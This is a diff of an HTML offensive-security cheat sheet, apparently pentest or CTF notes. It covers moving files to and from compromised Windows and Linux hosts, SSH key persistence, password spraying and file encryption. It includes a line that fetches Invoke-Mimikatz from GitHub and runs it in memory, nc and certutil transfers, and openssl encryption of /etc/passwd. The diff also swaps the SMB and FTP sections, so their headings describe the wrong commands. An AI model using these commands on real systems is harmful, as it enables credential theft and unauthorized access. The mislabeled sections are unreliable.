@@ -97,17 +97,17 @@ export SHELL=bash</code> </pre>
                     <p>From where you transfer the file</p>
                     <pre><code class="language-python">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
                     </ul>    
-                </ul>
 
-                <ul>
+
+
                     <h2>CertUtil</h2>
                     <ul>
                     <p>It's like WGET</p>
                     <pre><code class="language-python">certutil -urlcache -split -f "http://192.168.1.1/resource"</code> </pre>
                     </ul>    
-                </ul>
 
-                <ul>
+
+
 
                 <h2> Python </h2>
                 <ul>
@@ -146,20 +146,26 @@ export SHELL=bash</code> </pre>
                 file.write(data)
         print('Archivo recibido con éxito y guardado como archivo_recibido.txt.')"</code></pre>
             </ul>
-            </ul>
         </ul>
 
-            <ul>
+
                 <h2>SMB</h2>
                 <ul>
                     <p>Open smb server</p>
+                    <pre><code class="language-python">python3 -m pyftpdlib --port 21</code> </pre>
+                    <p>From windows </p>
+                    <pre><code class="language-python">(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')</code></pre>
+                </ul>
+
+                <h2>FTP</h2>
+                <ul>
+                    <p>Open ftp server</p>
                     <pre><code class="language-python">impacket-smbserver share . </code> </pre>
                     <p>From windows </p>
                     <pre><code class="language-python">copy \\10.10.14.10\SHARE\pr.exe C:\Windows\Temp\pr.exe</code></pre>
                 </ul>
-            </ul>
 
-            <ul>
+
                 <h2>SCP</h2>
                 <ul>
                     <p>From Kali to Windows</p>
@@ -167,8 +173,34 @@ export SHELL=bash</code> </pre>
                     <p>From Windows to Kali </p>
                     <pre><code class="language-cmd">scp "nadine@10.10.10.184:/C:/RecData/RecordInfoDB.db3" .</code></pre>
                 </ul>
-            </ul>
 
+                <h2>Base64</h2>
+                <ul>
+                    <h3>Windows</h3>
+                    <ul>
+                        <pre><code class="language-bash">base64 -w 0 file.sh</code></pre>
+                        <pre><code class="language-powershell">[IO.File]::WriteAllBytes("C:\Users\Public\file.sh", [Convert]::FromBase64String("d2h5IGFyZSB5b3Ugd2FzdGluZyB5b3VyIHRpbWUuIEhBQ0sgaW5zdGVhZA=="))</code></pre>
+                        <p>Reverse operation</p>
+                        <pre><code class="language-powershell">[Convert]::ToBase64String((Get-Content -path "C:\Users\Public\file.sh" -Encoding byte))</code></pre>
+                        
+                    </ul>
+
+                    <h3>Linux</h3>
+                    <ul>
+                        <pre><code class="language-bash">base64 -w 0 file.sh</code></pre>
+                        <p>Copy the string an paste it in the new machine to decode it and generate the new file</p>
+                        <pre><code class="language-bash">echo d2h5IGFyZSB5b3Ugd2FzdGluZyB5b3VyIHRpbWUuIEhBQ0sgaW5zdGVhZA== | base64 -d > file.sh</code></pre>
+                    </ul>
+                </ul>
+
+                <h2>Other Windows methods</h2>
+                <p>More examples <a class="notion-link" href="https://gist.github.com/HarmJ0y/bb48307ffa663256e239">Here</a></p>
+                <ul>
+                 <p>Download from web resource</p>                
+                 <pre><code class="language-powershell">(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com//PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')</code></pre>
+                 <p>Run it directly in memory</p>
+                 <pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')</code></pre>
+                </ul>
             </div>    
 
             <div class="notion-header"> 
@@ -223,7 +255,6 @@ crackmapexec ssh 10.10.10.184 -u USERNAME -p passwords.txt</code></pre>
 /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-large.txt</code></pre>
                    
-
                    <h2>In case you coudn't find anything go on with  </h2>
                    <pre><code class="language-bash">/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt     
 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
@@ -260,6 +291,32 @@ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9H
                    <p>Connect to the victims using private key</p> 
                    <pre><code class="language-bash">ssh -i persist root@10.10.10.187</code></pre> 
                   
+                </ul>
+            </div>
+
+            <div class="notion-header"> 
+                <h1 id="File Encryption">File Encryption</h1>
+            </div>
+
+            <div class="notion-body">
+                <ul>
+                <h3>Windows</h3>
+                <ul>    
+                   <p>It is a must to import module <b>Invoke-AESEncryption.ps1</b> (Import-Module .\Invoke-AESEncryption.ps1)</p> 
+                   <p>Simple ways of applying encryption to file</p>
+                   <p>Powershell AES encrypt</p> 
+                   <pre><code class="language-powershell">Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin</code></pre> 
+                   <p>Powershell AES decrypt</p> 
+                   <pre><code class="language-powershell">Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes</code></pre> 
+                </ul>
+
+                <h3>Linux</h3>
+                <ul>    
+                   <p>Encryt file using openssl. A password must be provided when using this command. This one will be used to decrypt</p> 
+                   <pre><code class="language-powershell">openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc</code></pre> 
+                   <p>openssl decrypt</p> 
+                   <pre><code class="language-powershell">openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd</code></pre> 
+                </ul>
                 </ul>
             </div>
             
